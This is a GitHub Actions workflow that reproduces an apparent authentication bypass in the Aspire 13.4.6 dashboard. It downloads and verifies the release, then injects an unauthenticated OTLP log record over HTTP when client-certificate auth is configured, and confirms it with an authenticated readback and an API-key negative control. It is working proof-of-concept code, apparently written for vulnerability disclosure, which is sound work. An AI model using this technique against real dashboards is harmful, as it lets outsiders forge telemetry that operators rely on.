name: Temporary Aspire 13.4.6 OTLP Certificate HTTP Telemetry Injection

on:
  push:
    branches:
      - agent/dotnet10-toolchain-20260815
    paths:
      - .github/workflows/_temporary-aspire-13-4-6-otlp-cert-http-telemetry-injection-20260815.yml

permissions:
  contents: read

concurrency:
  group: temporary-aspire-13-4-6-otlp-cert-http-telemetry-injection-20260815
  cancel-in-progress: false

jobs:
  reproduce:
    runs-on: ubuntu-24.04
    timeout-minutes: 35

    steps:
      - name: Download and verify official Aspire 13.4.6 release
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p release evidence payloads
          base='https://github.com/microsoft/aspire/releases/download/v13.4.6'
          archive='aspire-cli-linux-x64-13.4.6.tar.gz'
          curl --fail --location --retry 4 --retry-all-errors "$base/$archive" -o "release/$archive"
          curl --fail --location --retry 4 --retry-all-errors "$base/$archive.sha512" -o "release/$archive.sha512"
          expected="$(awk '{print tolower($1)}' "release/$archive.sha512")"
          actual="$(sha512sum "release/$archive" | awk '{print tolower($1)}')"
          printf 'EXPECTED_SHA512=%s\nACTUAL_SHA512=%s\n' "$expected" "$actual" | tee evidence/RELEASE_INTEGRITY.env
          test "$expected" = "$actual"
          tar -xzf "release/$archive" -C release
          aspire_bin="$(find release -type f -name aspire -perm -u+x -print -quit)"
          test -n "$aspire_bin"
          printf 'ASPIRE_BIN=%s\n' "$aspire_bin" | tee evidence/ASPIRE_BINARY.env
          "$aspire_bin" --version | tee evidence/ASPIRE_VERSION.txt
          cp "release/$archive.sha512" evidence/

      - name: Prove unauthenticated telemetry modification with authenticated readback
        shell: bash
        run: |
          set -euo pipefail
          aspire_bin="$(cut -d= -f2- evidence/ASPIRE_BINARY.env)"
          export CI=true
          export NO_COLOR=1
          export ASPIRE_INTERACTIVITY_ENABLED=false
          export ASPIRE_CLI_TELEMETRY_OPTOUT=1
          export DOTNET_CLI_TELEMETRY_OPTOUT=1
          export DOTNET_NOLOGO=1

          readback_key='readback-key-20260815'
          marker='MSRC_ASPIRE_OTLP_CERT_HTTP_AUTH_BYPASS_20260815'
          control_marker='MSRC_ASPIRE_OTLP_APIKEY_NEGATIVE_CONTROL_20260815'
          timestamp_nano="$(($(date +%s) * 1000000000))"

          cat > payloads/cert-bypass.json <<EOF
          {
            "resourceLogs": [{
              "resource": {
                "attributes": [
                  {"key": "service.name", "value": {"stringValue": "msrc-cert-http-bypass"}},
                  {"key": "service.instance.id", "value": {"stringValue": "instance-cert-1"}}
                ]
              },
              "scopeLogs": [{
                "scope": {"name": "msrc-reproducer", "version": "1.0.0"},
                "logRecords": [{
                  "timeUnixNano": "$timestamp_nano",
                  "observedTimeUnixNano": "$timestamp_nano",
                  "severityNumber": 17,
                  "severityText": "ERROR",
                  "body": {"stringValue": "$marker"},
                  "attributes": [
                    {"key": "proof.marker", "value": {"stringValue": "$marker"}},
                    {"key": "auth.presented", "value": {"boolValue": false}}
                  ]
                }]
              }]
            }]
          }
          EOF

          cat > payloads/api-key-control.json <<EOF
          {
            "resourceLogs": [{
              "resource": {
                "attributes": [
                  {"key": "service.name", "value": {"stringValue": "msrc-api-key-control"}},
                  {"key": "service.instance.id", "value": {"stringValue": "instance-control-1"}}
                ]
              },
              "scopeLogs": [{
                "scope": {"name": "msrc-reproducer", "version": "1.0.0"},
                "logRecords": [{
                  "timeUnixNano": "$timestamp_nano",
                  "observedTimeUnixNano": "$timestamp_nano",
                  "severityNumber": 17,
                  "severityText": "ERROR",
                  "body": {"stringValue": "$control_marker"},
                  "attributes": [{"key": "proof.marker", "value": {"stringValue": "$control_marker"}}]
                }]
              }]
            }]
          }
          EOF

          start_dashboard() {
            local name="$1"
            local otlp_auth_mode="$2"
            local otlp_key="$3"
            local base_port="$4"
            local frontend_port="$base_port"
            local grpc_port="$((base_port + 1))"
            local http_port="$((base_port + 2))"
            local log="evidence/${name}.dashboard.log"

            (
              export DASHBOARD__OTLP__AUTHMODE="$otlp_auth_mode"
              if [[ -n "$otlp_key" ]]; then
                export DASHBOARD__OTLP__PRIMARYAPIKEY="$otlp_key"
              else
                unset DASHBOARD__OTLP__PRIMARYAPIKEY || true
              fi
              export DASHBOARD__API__DISABLED=false
              export DASHBOARD__API__AUTHMODE=ApiKey
              export DASHBOARD__API__PRIMARYAPIKEY="$readback_key"
              exec setsid "$aspire_bin" dashboard run \
                --frontend-url "http://127.0.0.1:$frontend_port" \
                --otlp-grpc-url "http://127.0.0.1:$grpc_port" \
                --otlp-http-url "http://127.0.0.1:$http_port"
            ) > "$log" 2>&1 &

            DASHBOARD_PID=$!
            DASHBOARD_FRONTEND_PORT="$frontend_port"
            DASHBOARD_HTTP_PORT="$http_port"

            local ready=0
            for _ in $(seq 1 320); do
              if curl --silent --output /dev/null --connect-timeout 1 "http://127.0.0.1:$frontend_port/"; then
                ready=1
                break
              fi
              if ! kill -0 "$DASHBOARD_PID" 2>/dev/null; then
                break
              fi
              sleep 0.25
            done
            echo "READY=$ready" > "evidence/${name}.startup.env"
            test "$ready" -eq 1
          }

          stop_dashboard() {
            kill -TERM -- "-$DASHBOARD_PID" 2>/dev/null || true
            kill -TERM "$DASHBOARD_PID" 2>/dev/null || true
            for _ in $(seq 1 40); do
              kill -0 "$DASHBOARD_PID" 2>/dev/null || break
              sleep 0.1
            done
            kill -KILL -- "-$DASHBOARD_PID" 2>/dev/null || true
            kill -KILL "$DASHBOARD_PID" 2>/dev/null || true
            wait "$DASHBOARD_PID" 2>/dev/null || true
          }

          # Positive case: ClientCertificate configured over HTTP; request presents no certificate.
          start_dashboard '01-client-certificate-http' 'ClientCertificate' '' 35380
          cert_post_status="$(curl --silent --show-error \
            --connect-timeout 3 --max-time 10 \
            --request POST \
            --header 'Content-Type: application/json' \
            --data-binary @payloads/cert-bypass.json \
            --dump-header evidence/01-client-certificate-http.post.headers \
            --output evidence/01-client-certificate-http.post.body \
            --write-out '%{http_code}' \
            "http://127.0.0.1:$DASHBOARD_HTTP_PORT/v1/logs")"

          cert_read_status='000'
          for _ in $(seq 1 40); do
            cert_read_status="$(curl --silent --show-error \
              --connect-timeout 3 --max-time 10 \
              --header "X-API-Key: $readback_key" \
              --dump-header evidence/01-client-certificate-http.readback.headers \
              --output evidence/01-client-certificate-http.readback.json \
              --write-out '%{http_code}' \
              "http://127.0.0.1:$DASHBOARD_FRONTEND_PORT/api/telemetry/logs?resource=msrc-cert-http-bypass&limit=20" || true)"
            if [[ "$cert_read_status" = 200 ]] && grep -Fq "$marker" evidence/01-client-certificate-http.readback.json; then
              break
            fi
            sleep 0.25
          done
          cert_marker_present=0
          grep -Fq "$marker" evidence/01-client-certificate-http.readback.json && cert_marker_present=1
          stop_dashboard

          # Negative control: ApiKey configured; same unauthenticated write must fail and remain absent.
          start_dashboard '02-api-key-http-control' 'ApiKey' 'required-otlp-key-20260815' 35480
          control_post_status="$(curl --silent --show-error \
            --connect-timeout 3 --max-time 10 \
            --request POST \
            --header 'Content-Type: application/json' \
            --data-binary @payloads/api-key-control.json \
            --dump-header evidence/02-api-key-http-control.post.headers \
            --output evidence/02-api-key-http-control.post.body \
            --write-out '%{http_code}' \
            "http://127.0.0.1:$DASHBOARD_HTTP_PORT/v1/logs")"

          control_read_status="$(curl --silent --show-error \
            --connect-timeout 3 --max-time 10 \
            --header "X-API-Key: $readback_key" \
            --dump-header evidence/02-api-key-http-control.readback.headers \
            --output evidence/02-api-key-http-control.readback.json \
            --write-out '%{http_code}' \
            "http://127.0.0.1:$DASHBOARD_FRONTEND_PORT/api/telemetry/logs?limit=20" || true)"
          control_marker_present=0
          grep -Fq "$control_marker" evidence/02-api-key-http-control.readback.json && control_marker_present=1
          stop_dashboard

          candidate=0
          if [[ "$cert_post_status" = 200 && "$cert_read_status" = 200 && "$cert_marker_present" = 1 && \
                "$control_post_status" = 401 && "$control_marker_present" = 0 ]]; then
            candidate=1
          fi

          printf 'CERT_POST_STATUS=%s\nCERT_READBACK_STATUS=%s\nCERT_MARKER_PRESENT=%s\nCONTROL_POST_STATUS=%s\nCONTROL_READBACK_STATUS=%s\nCONTROL_MARKER_PRESENT=%s\nCANDIDATE_UNAUTHENTICATED_TELEMETRY_MODIFICATION=%s\n' \
            "$cert_post_status" "$cert_read_status" "$cert_marker_present" \
            "$control_post_status" "$control_read_status" "$control_marker_present" "$candidate" \
            | tee evidence/FINAL_VERDICT.env

          cp payloads/*.json evidence/
          (
            cd evidence
            find . -type f ! -name SHA256SUMS -print0 | sort -z | xargs -0 sha256sum > SHA256SUMS
          )

          test "$candidate" -eq 1

      - name: Upload exact release evidence
        if: always()
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: aspire-13.4.6-otlp-cert-http-telemetry-injection-20260815
          path: evidence
          retention-days: 1
          if-no-files-found: error
          compression-level: 9
          include-hidden-files: true
